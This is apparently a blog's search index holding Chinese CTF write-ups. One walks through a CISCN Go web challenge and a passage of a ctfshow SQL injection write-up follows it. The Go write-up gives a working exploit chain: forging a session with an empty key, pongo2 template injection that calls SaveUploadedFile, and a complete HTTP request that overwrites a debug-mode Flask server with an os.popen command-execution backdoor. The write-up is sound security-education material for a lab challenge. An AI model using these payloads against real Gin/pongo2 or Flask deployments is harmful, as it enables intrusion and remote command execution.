<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CISCN 国赛web题目复现</title>
      <link href="/2023/10/13/CISCN/"/>
      <url>/2023/10/13/CISCN/</url>
      
        <content type="html"><![CDATA[<h1>CISCN 国赛web题目复现</h1><h2 id="go-session">go_session</h2><h3 id="代码审计">代码审计</h3><p>来看看这道go的session伪造和pongo2模板注入</p><p>给了源码先来做代码审计</p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主函数主要引入route文件和golang的Gin框架，设置三个路由<code>/index</code>、<code>/admin</code>、<code>/flask</code>，并将项目运行在80端口上</p><p><strong>route.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// route.go</span></span><br><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个路由文件，设置了三个路由，应用了Gin框架和pongo2的模板引擎</p><p><code>var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))</code>这段代码读取环境变量中的SESSION_KEY用于生成session，但经过尝试发现没法获取到密钥，经过查询发现 <code>os.Getenv</code> 如果获取不存在的环境变量就会返回空值，可以大胆猜测密钥为空</p><p><strong>index</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Index函数用于处理根路径下的请求，它的参数是一个指向gin.Context的指针，而gin.Context是Gin框架中的一种上下文对象类型。它是一个包含了当前http请求和响应的信息、操作方法和属性的结构体，用于在处理http请求时传递和操作这些信息。同时gin.Context还提供了一系列的方法用于处理这些信息，这个将是我们后面利用的重点。</p><p>函数首先会获取名为 session-name 的cookie会话，然后判断会话中的name值是否为空，如果为空，就会将name的值设置为guest，然后将会话保存到请求中，最后使用String方法返回一个状态码和一个字符串。(注意无论伪造cookie是否成功，均回显hello，guest！)</p><p>当我们直接访问时回显hello，guest！</p><p><strong>admin</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Admin函数用于处理 /admin 下的请求，首先会获取会话，然后判断name字段的值是不是admin，如果不是就立即返回No，所以这里要进行session-name构造，使name字段的值为admin，然后进行下一步的操作，接着就是获取url请求中name字段的值，默认值是ssti，接着用EscapeString函数进行转义，防止XSS攻击，然后使用pongo2的模板引擎将字符串&quot;Hello&quot;和转义后的name字段值作为模板内容写入模板中，然后就是执行模板，将执行的结果存储在out中，最后返回out。（存在模板注入漏洞）</p><p>直接访问就会回显No</p><p><strong>Flask</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flask函数用于处理 /flask 函数下的请求，首先获取会话，然后判断name字段是否为空，如果不为空则获取url中name字段的值，并将其与本地地址拼接，发送一个GET请求。请求结束后关闭响应体，然后读取响应题的内容，将其转换为字符串返回。简单来说就是获取name参数访问内部5000端口的flask服务并回显页面。直接访问会爆404错误</p><p>我们尝试传入name参数<code>/flask?name=/</code>，引发报错拿到flask源码</p><p><img src="https://s2.loli.net/2023/10/13/OZRUk5qBKzW8Qev.png" alt="flak源码"></p><p><strong><a href="http://server.py">server.py</a></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>看这个源码，很显然在5000端口搭建的是一个flask的程序，而且更重要的是，这个程序设置了debug=True，说明程序开启了热加载功能，代码在更改后会自动重新加载程序，这意味着我们对代码进行更改后就会立即生效</p><blockquote><p>经验：flak框架开启debug的考点主要有两种，一是配合任何文件读取算pin码实现RCE，二是考察文件覆盖，也就是热加载</p></blockquote><p><strong>注意</strong>：<code>/flask</code>路由中的拼接逻辑，这个通过参数拼接访问本地5000端口上的flask程序，问题就出在拼接上，c.DefaultQuery()获取的是url请求中name参数的值直接拼接上去，如果我传入的name的值为空的话，c.DefaultQuery()就是空，那就相当于直接访问<code>http://127.0.0.1:5000/</code></p><h3 id="复现过程">复现过程</h3><p>我们一步一步来，想在<code>/admin</code>路由中利用SSTI覆写文件之前需要先伪造cookie绕过检测，根据前面的猜测我们只需要略微更改session的生成函数，若<code>if session.Values[&quot;name&quot;] != &quot;admin&quot; &#123;session.Values[&quot;name&quot;] = &quot;admin&quot;</code>,并拉取源代码在本地运行即可伪造出cookie，若伪造成功应回显<code>hello,admin</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">message := fmt.Sprintf(<span class="string">&quot;Hello, %s&quot;</span>, session.Values[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">c.String(<span class="number">200</span>, message)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意在本地运行go代码时，除了下载SDK和相应库外，还可能报listen tcp :8080: bind: An attempt was made to access a socket in a way forbidden这类错误，原因是本地8080端口常有其他服务，导致端口占用。在main函数中该换其他端口号即可。</p></blockquote><p><img src="https://s2.loli.net/2023/10/14/yfbwG3Y9ZizodPJ.png" alt="swssion伪造"></p><p>这样就算成功了，复制session到靶场访问<code>/admin</code>回显hello，ssti开始下一步</p><p>这里我们用debug模式下的热加载替换flask源码实现RCE，要用到SaveUploadedFile方法实现任意文件写</p><p><code>&#123;&#123;c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")&#125;&#125;</code></p><blockquote><p>但这里要注意参数经过 html.EscapeString(name) 转义，会将双引号转义掉，所以要换一种方式，对于&quot;file&quot;，gin.Context还提供了另一种方法，HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin/route.Admin，然后可以用过滤器last获取最后一个字符串。对于 “/app/server.py”，可以在请求头中将Referer字段设置成 “/app/server.py”，然后用 Request.Referer()方法获取Referer的值。（还有其他方法，如Request.Host()、<a href="http://Request.UA">Request.UA</a>()等）</p></blockquote><p>还需要更改的点，因为要从Referer头中获取源码路径，故添加<code>Referer: /app/server.py</code>，且上传文件提交表单需要Content-Type 请求，同时需要边界字符串分割（可自定义），故添加<code>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND</code></p><p>上传源代码也很简单,接收一个名为 name 的参数，并使用 os.popen() 执行该参数作为命令，并返回执行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    file=os.popen(name).read()</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>完整数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8b07fdbf-48c8-44c7-9482-7c2c5ac378d9.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>/app/server.py</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session-name=MTY5NzIwNDMzMXxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXwR0sKvw-X3wCZB3mczzdP14XPXLMSOjQd_CcqOagipbg==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>429</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary8ALIn5Z2C3VlBqND</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;n&quot;; filename=&quot;1.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">app = Flask(__name__)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@app.route(<span class="string">&#x27;/&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql">def <span class="keyword">index</span>():</span></span><br><span class="line"><span class="language-pgsql">    <span class="type">name</span> = request.args[<span class="string">&#x27;name&#x27;</span>]</span></span><br><span class="line"><span class="language-pgsql">    file=os.popen(<span class="type">name</span>).<span class="keyword">read</span>()</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">return</span> file</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">if</span> __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="language-pgsql">    app.run(host=&quot;0.0.0.0&quot;, port=<span class="number">5000</span>, <span class="keyword">debug</span>=<span class="keyword">True</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary8ALIn5Z2C3VlBqND--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/10/14/JLWpAzZREQU5SKe.png" alt="success"></p><p>接下来访问<code>/flask</code>路由传参查看环境变量即可<code>?name=?name=env</code></p><p><img src="https://s2.loli.net/2023/10/14/Evh39Jum5AqPwin.png" alt="env"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSTI </tag>
            
            <tag> session伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow题解-sql注入</title>
      <link href="/2023/09/22/CTFshow/CTFshow4/"/>
      <url>/2023/09/22/CTFshow/CTFshow4/</url>
      
        <content type="html"><![CDATA[<h1>CTF show Sql注入</h1><p>做此类题之前最好在本地环境下进行sql语句测试，确保本地打通后再测试远程，这样可提高对于sql语句的掌握程度</p><h2 id="web171">web171</h2><h3 id="题目描述">题目描述</h3><p><strong>从此题开始的150道题全部为sql注入，准备好了吗？</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>本题为白盒测试，给出了sql语句，并且再过滤中暗示包含flag的字段<code>username=flag</code>，在本地DataGrip中尝试拼接语句，这里我测试了正常拼接和联合查询,在本地均可正常回显，但打不通远程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span 